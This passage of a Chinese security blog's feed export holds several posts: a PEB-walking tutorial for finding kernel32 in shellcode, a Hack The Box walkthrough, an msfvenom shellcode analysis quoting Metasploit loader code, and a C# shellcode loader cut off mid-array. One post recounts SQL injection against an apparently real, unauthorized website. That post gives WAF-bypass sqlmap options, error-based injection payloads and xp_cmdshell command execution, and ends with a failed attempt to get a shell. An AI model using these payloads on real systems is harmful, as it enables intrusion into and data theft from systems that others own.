+0x034 DontCallForThreads : 0y0   +0x034 ProcessAttachCalled : 0y0   +0x034 ProcessAttachFailed : 0y1   +0x034 CorDeferredValidate : 0y0   +0x034 CorImage         : 0y1   +0x034 DontRelocate     : 0y0   +0x034 CorILOnly        : 0y1   +0x034 ChpeImage        : 0y1   +0x034 ReservedFlags5   : 0y01   +0x034 Redirected       : 0y1   +0x034 ReservedFlags6   : 0y11   +0x034 CompatDatabaseProcessed : 0y0   +0x038 ObsoleteLoadCount : 0xdb30   +0x03a TlsIndex         : 0x7750   +0x03c HashLinks        : _LIST_ENTRY [ 0x59b71f87 - 0x0 ]   +0x044 TimeDateStamp    : 0   +0x048 EntryPointActivationContext : 0x004b3bc0 _ACTIVATION_CONTEXT   +0x04c Lock             : 0x004b3bc0 Void   +0x050 DdagNode         : 0x004b3bc0 _LDR_DDAG_NODE   +0x054 NodeModuleLink   : _LIST_ENTRY [ 0x0 - 0x0 ]   +0x05c LoadContext      : 0x773f1194 _LDRP_LOAD_CONTEXT   +0x060 ParentDllBase    : 0x004b3788 Void   +0x064 SwitchBackContext : 0x004b3680 Void   +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE   +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE   +0x080 OriginalBase     : 0xf9727ce2   +0x088 LoadTime         : _LARGE_INTEGER 0x00000004`536cd652   +0x090 BaseNameHashValue : 0x4000   +0x094 LoadReason       : 2 ( LoadReasonDynamicForwarderDependency )   +0x098 ImplicitPathOptions : 0   +0x09c ReferenceCount   : 0   +0x0a0 DependentLoadFlags : 0xabababab   +0x0a4 SigningLevel     : 0xab &#39;&#39;</code></pre><p>对面上面的汇编</p><pre><code class="asm">mov eax,[fs:0x30] ;EAX=PEBmov eax,[eax+0xc] ;EAX=PEB-&gt;Ldrmov esi,[eax+0x14] ;ESI=PEB-&gt;Ldr.InMemOrder (Ldr.InMemOrder地址赋到ESI寄存器)lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)mov ebx,[eax+0x10] ;EBX=Kernel32基地址</code></pre><p>最后对应的0x10链表首地址放的即为kernel32.dll的基址</p><pre><code> +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x75f50000 - 0x75f65f70 ]</code></pre><p>其实可以简写成别的(lodsd看起来容易把人搞混）</p><pre><code class="asm">mov eax, fs:[0x30]   //得到PEB地址，其实这里还有个TEB的概念，但是只用到这一次，为了防止混乱，就不再解释了mov eax, [eax + 0xc]//指向PEB_LDR_DATA结构的首地址mov eax, [eax + 0x1c]//一个双向链表的地址mov eax, [eax]//得到第二个条目kernelBase的链表mov eax, [eax]//得到第三个条目kernel32链表（win10）mov eax, [eax + 0x8] //kernel32.dll地址</code></pre><p>对应0x8链表里的kernel32.dll基址<br><img src="https://s3.ax1x.com/2021/02/22/yHtCWQ.png" alt=""></p><p><strong>在内存里的过程</strong><br>可以使用OD进行验证，od拖入test.exe。然后在堆栈窗口ctrl+G输入<code>fs:[0]</code>跳到所在位置<br>执行<code>mov eax,fs[0x30]</code>后<br><img src="https://s3.ax1x.com/2021/02/22/yHN04U.png" alt=""></p><p>执行<code>mov eax, [eax + 0xc]</code>得到LDR地址<br>(得到PEB地址后，在内存窗口ctrl+G输入PEB的地址，选择”长型”-&gt;”地址”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD3dA.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHwYGT.png" alt=""></p><p>执行<code>lodsd ;ESI内存地址指向的值写入到EAX EAX=Second module (进入链表：Flink            : Ptr32 _LIST_ENTR)-&gt;进入Ldr.InMemOrder链表的的一个元素位地址</code>得到链表里的第一个Flink的地址<br>(数据窗口选择刚刚的InMemoryOrderModuleList地址，选择”数据窗口跟随”)<br><img src="https://s3.ax1x.com/2021/02/22/yHD5w9.png" alt=""></p><p>继续执行</p><pre><code>xchg eax,esi ;EAX和ESI交换值 EAX=ESI,ESI=EAX (EAX=Ldr.InMemOrder-&gt;链表第一元素位的地址,然后从EAX和ESI互相切换值)lodsd ;EAX=Third(Kernel32)</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHr9Yt.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/22/yHrZwj.png" alt=""></p><p>如何用C实现？<br>1.直接用汇编返回对PEB地址然后根据微软给的数据结构解析即可<br>2.直接用给出的数据结构来解析 （好像可以这么写）</p><p>第一种方法</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main(){    DWORD PPEB;    DWORD LLDR;    DWORD dllbase;    DWORD initlist;    DWORD virtualaddress;    PCHAR dllname;    char *kernel32dllname = &quot;KERNEL32.dll&quot;;    PIMAGE_DOS_HEADER dosheader;    PIMAGE_NT_HEADERS ntheader;    PIMAGE_EXPORT_DIRECTORY exportdirectory;    __asm {        mov eax, fs:[0x30];EAX = PEB        mov PPEB,eax    }    LLDR = *(PDWORD)(PPEB + 0xc); //LDR    printf(&quot;PEB Address:0x%x\n&quot;, PPEB);    initlist=*(PDWORD)(LLDR+0x1c); //LDR-&gt;InInitializationOrderModuleList    CHAR szGetProcAddr[]=&quot;GetProcAddress&quot;;    CHAR szLoadLib[]=&quot;LoadLibraryA&quot;;    for (;dllbase = *(PDWORD)(initlist + 0x8);initlist = *(PDWORD)initlist) { //遍历InMemoryOrderLinks链表        dosheader = (PIMAGE_DOS_HEADER)dllbase; //DOS头部        ntheader = (PIMAGE_NT_HEADERS)(dllbase+dosheader-&gt;e_lfanew); //PE头部        virtualaddress = ntheader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress; //EXPORT_DIRECTORY        exportdirectory = (PIMAGE_EXPORT_DIRECTORY)(dllbase + virtualaddress); //导出表        dllname = (PCHAR)(dllbase + exportdirectory-&gt;Name); //DLL Name        if (!strcmp(dllname, kernel32dllname)) {            printf(&quot;%s Address:0x%x\n&quot;, kernel32dllname, dllbase);        }    }    system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s3.ax1x.com/2021/02/22/yHrsne.png" alt=""></p><p>之后就是从kernel32.dll的PE里导出loadlibraryA和GetProcAddress函数的地址。<br>（下次在写）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jb51.net/article/171962.htm" target="_blank" rel="noopener">https://www.jb51.net/article/171962.htm</a><br><a href="https://zhuanlan.zhihu.com/p/109079902" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/109079902</a><br><a href="https://www.cnblogs.com/lsgxeva/p/10794735.html" target="_blank" rel="noopener">https://www.cnblogs.com/lsgxeva/p/10794735.html</a><br><a href="https://xz.aliyun.com/t/2108" target="_blank" rel="noopener">https://xz.aliyun.com/t/2108</a><br><a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97</a></p>]]></content>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box Academy</title>
      <link href="/posts/ae09ddc5.html"/>
      <url>/posts/ae09ddc5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>没事干和队友打htb</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap</p><pre><code>portscan:22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>whatweb获取web信息的时候发现跳转到<code>http://academy.htb/</code>的域失败了，/etc/hosts加了上去</p><pre><code>http://academy.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.215], Title[Hack The Box Academy]</code></pre><p>常规的路径扫描<br><img src="https://s3.ax1x.com/2021/02/20/y4N0nU.png" alt=""></p><h2 id="入口点立足"><a href="#入口点立足" class="headerlink" title="入口点立足"></a>入口点立足</h2><p>打开web发现可以注册和登录，注册可以注册admin用户<br><img src="https://s3.ax1x.com/2021/02/20/y4NBBF.png" alt=""></p><p>到后台登录队友说是弱口令登录，but我就是tm不行。后面找其要来cookie登上，发现提示<code>dev-staging-01.academy.htb</code>,添加到hosts<br>访问发现是laravel<br><img src="https://s3.ax1x.com/2021/02/20/y4NsAJ.png" alt=""></p><p>由于开启了debug，得到API_KEY<br><img src="https://s3.ax1x.com/2021/02/20/y4N21x.png" alt=""></p><p>搜索laravel RCE发现一个CVE-2018-15133<br>exp：<a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133" target="_blank" rel="noopener">https://github.com/aljavier/exploit_laravel_cve-2018-15133</a><br>利用该CVE获得shell<br><img src="https://s3.ax1x.com/2021/02/20/y4N5He.png" alt=""></p><h2 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h2><p><code>ls -al /home/*</code>确定要攻击的目标用户<br>（带有user.txt的才是最终用户）<br><img src="https://s3.ax1x.com/2021/02/20/y4USEQ.png" alt=""></p><p>在web目录瞎翻，翻到两个数据库凭证<br><img src="https://s3.ax1x.com/2021/02/20/y4NoAH.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/20/y4Nju8.png" alt=""></p><p>手机/home/目录下的用户，使用hydra爆破得到用户<br><img src="https://s3.ax1x.com/2021/02/20/y4UPCn.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>拿完user.txt后，经过一个小时后使用linPEAss脚本进行信息收集，发现有个su的用户提权的密码<br><img src="https://s3.ax1x.com/2021/02/20/y4Ui3q.png" alt=""></p><p>登录后尝试sudo -l发现拥有sudo权限<br><img src="https://s3.ax1x.com/2021/02/20/y4UEuT.png" alt=""></p><p>GTFObins搜索到对应的提权方法<br><a href="https://gtfobins.github.io/gtfobins/composer/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/composer/</a></p><p>提权成功<br><img src="https://s3.ax1x.com/2021/02/20/y4UZbF.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>msfvenom生成的windows/exec shellcode分析</title>
      <link href="/posts/c86ff70d.html"/>
      <url>/posts/c86ff70d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于之前就想分析msfvenom生成的payload。经过前后几次波折<br>第三次分析后才看懂了不少。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>1.msfvenom生成shellcode<br>ps:用x86更好的分析</p><pre><code>msfvenom -p windows/exec cmd=calc.exe -f raw -o shellcode.bin</code></pre><p>2.将shellcode放入一个PE里<br>准备工具:</p><ul><li>yasm.exe</li><li>GoLink.exe<br><img src="https://s3.ax1x.com/2021/02/19/yfWvJf.png" alt=""></li></ul><p>将shellcdoe.bin和shellcode.asm放在同一个目录<br>shellcode.asm</p><pre><code class="asm">Global StartSECTION &#39;foo&#39; write,execute,readStart:incbin &quot;shellcode.bin&quot;</code></pre><p>生成obj后在生成exe</p><pre><code>yasm.win32.exe -f win32 -o shell.obj shellcode.asmGolink /ni /entry Start shell.obj</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yffFwn.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yffkoq.png" alt=""></p><p>3.利用IDA分析<br><img src="https://s3.ax1x.com/2021/02/19/yffZWT.png" alt=""></p><p>loc_401088函数分析</p><p>msf生成payload的模板对照分析<br><img src="https://s3.ax1x.com/2021/02/19/yff8Fx.png" alt=""><br>提一点:msf生成的shellcode模板对应的API是<code>hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )</code><br>计算公式：</p><pre><code class="text">msf的windows API方法：DLL HASH+API HASH=HASH如果知道最终hash求对应的API名称，计算公式：HASH-DLL HASH=API HASH例如：kernel32.dll HASH-&gt;92AF16DAWinexec HASH-&gt;F4C07457x86截取最后8位最终hash位：92AF16DA+F4C07457=876F8B31得到hash反求API hash：876F8B31-92AF16DA=F4C07457对应API和DLL 的HASH参考:https://github.com/hidd3ncod3s/WindowsAPIhash</code></pre><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a></p><pre><code class="ruby">  def self.win32_rwx_exec_thread(code, block_offset, which_offset=&#39;start&#39;)    stub_block = Rex::Payloads::Shuffle.from_graphml_file(      File.join(Msf::Config.install_root, &#39;data&#39;, &#39;shellcode&#39;, &#39;block_api.x86.graphml&#39;),      arch: ARCH_X86,      name: &#39;api_call&#39;    )    stub_exit = %Q^    ; Input: EBP must be the address of &#39;api_call&#39;.    ; Output: None.    ; Clobbers: EAX, EBX, (ESP will also be modified)    ; Note: Execution is not expected to (successfully) continue past this block    exitfunk:      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...      push 0x9DBD95A6        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7      jl goodbye       ; Then just call the exit function...      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...      jne goodbye      ;      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread    goodbye:                 ; We now perform the actual call to the exit function      push byte 0            ; push the exit function parameter      push ebx               ; push the hash of the exit function      call ebp               ; call EXITFUNK( 0 );    ^    stub_alloc = %Q^      pushad                 ; Save registers      cld                    ; Clear the direction flag.      call start             ; Call start, this pushes the address of &#39;api_call&#39; onto the stack.    delta:                   ;    #{stub_block}    start:                   ;      pop ebp                ; Pop off the address of &#39;api_call&#39; for calling later.    allocate_size:       mov esi,#{code.length}    allocate:      push byte 0x40         ; PAGE_EXECUTE_READWRITE      push 0x1000            ; MEM_COMMIT      push esi               ; Push the length value of the wrapped code block      push byte 0            ; NULL as we dont care where the allocation is.      push 0xE553A458        ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAlloc&quot; )      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );      mov ebx, eax           ; Store allocated address in ebx      mov edi, eax           ; Prepare EDI with the new address      mov ecx, esi           ; Prepare ECX with the length of the code      call get_payload    got_payload:      pop esi                ; Prepare ESI with the source to copy      rep movsb              ; Copy the payload to RWX memory      call set_handler       ; Configure error handling    exitblock:    #{stub_exit}    set_handler:      xor eax,eax;     push dword [fs:eax];     mov dword [fs:eax], esp      push eax               ; LPDWORD lpThreadId (NULL)      push eax               ; DWORD dwCreationFlags (0)      push eax               ; LPVOID lpParameter (NULL)      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)      push eax               ; SIZE_T dwStackSize (0 for default)      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)      push 0x160D6838        ; hash( &quot;kernel32.dll&quot;, &quot;CreateThread&quot; )      call ebp               ; Spawn payload thread      pop eax                ; Skip;     pop eax                ; Skip      pop eax                ; Skip      popad                  ; Get our registers back;     sub esp, 44            ; Move stack pointer back past the handler    ^    stub_final = %Q^    get_payload:      call got_payload    payload:    ; Append an arbitrary payload here    ^    stub_alloc.gsub!(&#39;short&#39;, &#39;&#39;)    stub_alloc.gsub!(&#39;byte&#39;, &#39;&#39;)    wrapper = &quot;&quot;    # regs    = %W{eax ebx ecx edx esi edi ebp}    cnt_jmp = 0    cnt_nop = 64    stub_alloc.each_line do |line|      line.gsub!(/;.*/, &#39;&#39;)      line.strip!      next if line.empty?      if cnt_nop &gt; 0 &amp;&amp; rand(4) == 0        wrapper &lt;&lt; &quot;nop\n&quot;        cnt_nop -= 1      end      if cnt_nop &gt; 0 &amp;&amp; rand(16) == 0        cnt_nop -= 2        cnt_jmp += 1        wrapper &lt;&lt; &quot;jmp autojump#{cnt_jmp}\n&quot;        1.upto(rand(8)+1) do          wrapper &lt;&lt; &quot;db 0x#{&quot;%.2x&quot; % rand(0x100)}\n&quot;          cnt_nop -= 1        end        wrapper &lt;&lt; &quot;autojump#{cnt_jmp}:\n&quot;      end      wrapper &lt;&lt; line + &quot;\n&quot;    end</code></pre><p>start函数对应分析<br><img src="https://s3.ax1x.com/2021/02/19/yffqcF.png" alt=""></p><p>由于静态call ebp这种找不到对应的地址，通过od来跟踪到loc_401088函数里的<code>call ebp</code><br>1.首先栈顶最上放出栈到ebp<br>2.然后push 1<br>3.在从堆栈里把calc.exe赋予到eax -&gt; lea eax,[ebp+0B2h]<br><img src="https://s3.ax1x.com/2021/02/19/yfhX28.png" alt=""><br>4.push eax，将calc.exe写入到堆栈<br>5.push Winexec对应的函数<br>6.然后call栈顶<br><img src="https://s3.ax1x.com/2021/02/19/yfhYEn.png" alt=""></p><p>地址跳转到00401006地址<br><img src="https://s3.ax1x.com/2021/02/19/yfI5KU.png" alt=""></p><p>PEB-&gt;Ldr-&gt;</p><pre><code> mov     edx, fs:[eax+30h] ; 寻找PEB地址foo:0040100F                 mov     edx, [edx+0Ch]  ; PEB_LDR_DATAfoo:00401012                 mov     edx, [edx+14h]  ; ModuleEntryPointfoo:00401015foo:00401015 loc_401015:                             ; CODE XREF: start+86↓jfoo:00401015                 mov     esi, [edx+28h]  ; 遍历获取某些值的区段foo:00401018                 movzx   ecx, word ptr [edx+26h] xor     edi, edi        ; 清空EDI寄存器 lodsb                   ; 将SI的存储值赋予ALfoo:0040101E                                         ; mov eax,[esi]foo:0040101E                                         ; df=1;SI+1 else SI-1</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yf78DU.png" alt=""></p><p>寻找对应API的函数</p><pre><code>0040101E   &gt; /AC            lods byte ptr ds:[esi]0040101F   . |3C 61         cmp al,0x6100401021   . |7C 02         jl short shell.0040102500401023   . |2C 20         sub al,0x2000401025   &gt; |C1CF 0D       ror edi,0xD00401028   . |01C7          add edi,eax0040102A   .^\E2 F2         loopd short shell.0040101E0040102C   .  52            push edx0040102D   .  57            push edi0040102E   .  8B52 10       mov edx,dword ptr ds:[edx+0x10]          ;  shell.0040000000401031   .  8B4A 3C       mov ecx,dword ptr ds:[edx+0x3C]00401034   .  8B4C11 78     mov ecx,dword ptr ds:[ecx+edx+0x78]00401038   .  E3 48         jecxz short shell.004010820040103A   .  01D1          add ecx,edx0040103C   .  51            push ecx0040103D   .  8B59 20       mov ebx,dword ptr ds:[ecx+0x20]00401040   .  01D3          add ebx,edx00401042   .  8B49 18       mov ecx,dword ptr ds:[ecx+0x18]00401045   &gt;  E3 3A         jecxz short shell.0040108100401047   .  49            dec ecx00401048   .  8B348B        mov esi,dword ptr ds:[ebx+ecx*4]0040104B   .  01D6          add esi,edx0040104D   .  31FF          xor edi,edi0040104F   &gt;  AC            lods byte ptr ds:[esi]00401050   .  C1CF 0D       ror edi,0xD00401053   .  01C7          add edi,eax00401055   .  38E0          cmp al,ah00401057   .^ 75 F6         jnz short shell.0040104F00401059   .  037D F8       add edi,dword ptr ss:[ebp-0x8]0040105C   .  3B7D 24       cmp edi,dword ptr ss:[ebp+0x24]0040105F   .^ 75 E4         jnz short shell.00401045</code></pre><p>最后得到的API函数地址赋于eax</p><pre><code>00401075   .  894424 24     mov dword ptr ss:[esp+0x24],eax          ;  kernel32.WinExec</code></pre><p><img src="https://s3.ax1x.com/2021/02/19/yfbU6x.png" alt=""></p><p>最后jmp eax对应的地址执行<br><img src="https://s3.ax1x.com/2021/02/19/yfbIAg.png" alt=""></p><p>执行完WinExec函数后，执行GetVersion判断退出操作<br><img src="https://s3.ax1x.com/2021/02/19/yhnum6.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhnY6I.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/19/yhna0f.png" alt=""></p><p>简写成一个过程：<br>PEB-&gt;ModuleEntryPoint-&gt;找到Kernel32.dll-&gt;WinExec-&gt;lea eax-&gt;call-&gt;Exit</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/4a380771d3a18011af153e47e1d08a4a83feb452/lib/msf/util/exe.rb#L1803</a><br><a href="https://www.anquanke.com/post/id/85386" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85386</a><br><a href="http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html" target="_blank" rel="noopener">http://9b113d1a.blogspot.com/2017/03/les-hash-composite-couplemodulefunction.html</a><br><a href="https://my.oschina.net/u/4593082/blog/4418768" target="_blank" rel="noopener">https://my.oschina.net/u/4593082/blog/4418768</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一次糟糕的mssql注入尝试</title>
      <link href="/posts/976028d5.html"/>
      <url>/posts/976028d5.html</url>
      <content type="html"><![CDATA[<h2 id="观前提醒"><a href="#观前提醒" class="headerlink" title="观前提醒"></a>观前提醒</h2><p>本文已对实际的人以游戏或番剧人名代替</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>源于昨天一次组团冲塔的时候发现的一个站。原本随便看一下，没注入就换目标。结果呢<br>随手一测还真有个注入。然后开始漫长的摸索…</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一个熟悉的登录框<br><img src="https://s3.ax1x.com/2021/02/13/ysQszT.png" alt=""></p><p>哎，反手一个引号。<code>sql server Error</code><br><img src="https://s3.ax1x.com/2021/02/13/ysQReJ.png" alt=""></p><p>sqlmap扔进去？没跑出来，经过测试，得到sqlmap command绕过 WAF （空气waf就像3090一样根本不存在）</p><pre><code>sudo proxychains sqlmap -r post.txt --tamper=space2randomblank.py,equaltolike.py -v 3</code></pre><p>盲注，慢的一批<br><img src="https://s3.ax1x.com/2021/02/13/ysQbOe.png" alt=""></p><p>就在逐个跑表的时候，一名A哥已经手注了。这时我赶紧白嫖了A哥的payload</p><pre><code>id=1&#39; and 1&lt;(select @@version) --&amp;password=11111</code></pre><p>报错注入bingo<br><img src="https://s3.ax1x.com/2021/02/13/yslulT.png" alt=""></p><p>获取所有表名或子段名/某指定表名</p><pre><code>id=admin&#39; and 1&lt;(select QUOTENAME(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;wwwlog&#39;  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_CATALOG=DB_NAME()  FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasdid=admin&#39; and 1&lt;(select QUOTENAME(UNAME) from master dbo.wwwlog FOR XML PATH(&#39;&#39;))--&amp;passwd=dasdasd</code></pre><p>后发现sqlmap跑出来的数据和查出来的差一大截，索性不用sqlmap<br><img src="https://s3.ax1x.com/2021/02/13/yslq3V.png" alt=""></p><p>后面测试多段注入使用cmd_shell尝试能否使用的时候，发现并未成功（后面发现的原因是master..xp_cmdshell不行，直接xp_cmdshell就可以？？？？）<br><img src="https://s3.ax1x.com/2021/02/13/ys1zM8.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>思考半天后不知如何实现回显RCE，后搜到一篇文章如醍醐灌顶。<br>创建表，把执行结果插入到表里然后读取即可</p><pre><code>id=admin&#39; CREATE TABLE tmpx (tmp1 varchar(max),tmp2 varchar(max))--&amp;password=11id=admin&#39; insert into tmpx (tmp1) exec xp_cmdshell &#39;whoami&#39;--&amp;password=11id=admin&#39; and 1&lt;(select QUOTENAME(tmp1) from tmpx FOR XML PATH(&#39;&#39;)) --&amp;password=11id=admin&#39; drop table tmpx --&amp;password=11</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ys3NLD.png" alt=""></p><p>为了方便执行命令，写了个py<br><img src="https://s3.ax1x.com/2021/02/13/ysG8KK.png" alt=""></p><p>然后遇见的几个坑<br>1.type读文件不行<br>2.sql server的表存储内容大小有限，超过会被截断</p><p>解决方法统一用powershell来代替<br>读取进程</p><pre><code>powershell &quot;tasklist /svc | Select -First 35&quot; #读取到35行powershell &quot;$data=tasklist /svc;$data[36..60]&quot; #从36行读到60行</code></pre><p>用上面的第二条命令逐行读取直到读完全部<br><img src="https://s3.ax1x.com/2021/02/13/ysJmsf.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ysJQoQ.png" alt=""></p><p>powershell代替type命令读取文件</p><pre><code>powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts&quot;powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts | Select -First 10&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ysJIfA.png" alt=""></p><p>尝试上线提权发现，shell连几秒后马上断开。最后确定是IDS的问题，现在卡在这个地方…</p>]]></content>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>powershell Assembly Load的使用</title>
      <link href="/posts/7318adbf.html"/>
      <url>/posts/7318adbf.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析昨天的vbs的时候看见了个为<code>[Reflection.Assembly]::Load</code>的技术。好像没研究过<br>就拿来研究一下。</p><p>简要说明：利用powershell进行C#里的函数调用</p><p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>注意实现，被调用的类名和函数名。须为public。且为静态(static)<br>test.cs</p><pre><code class="c#">using System;using System.Runtime.InteropServices;namespace run{    public class Program    {        public static void box() {            byte[] shellcode = new byte[304]{                                    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,                                    0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,                                    0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,                                    0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,                                    0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,                                    0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,                                    0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,                                    0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,                                    0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,                                    0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,                                    0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,                                    0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,                                    0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,                                    0xFF, 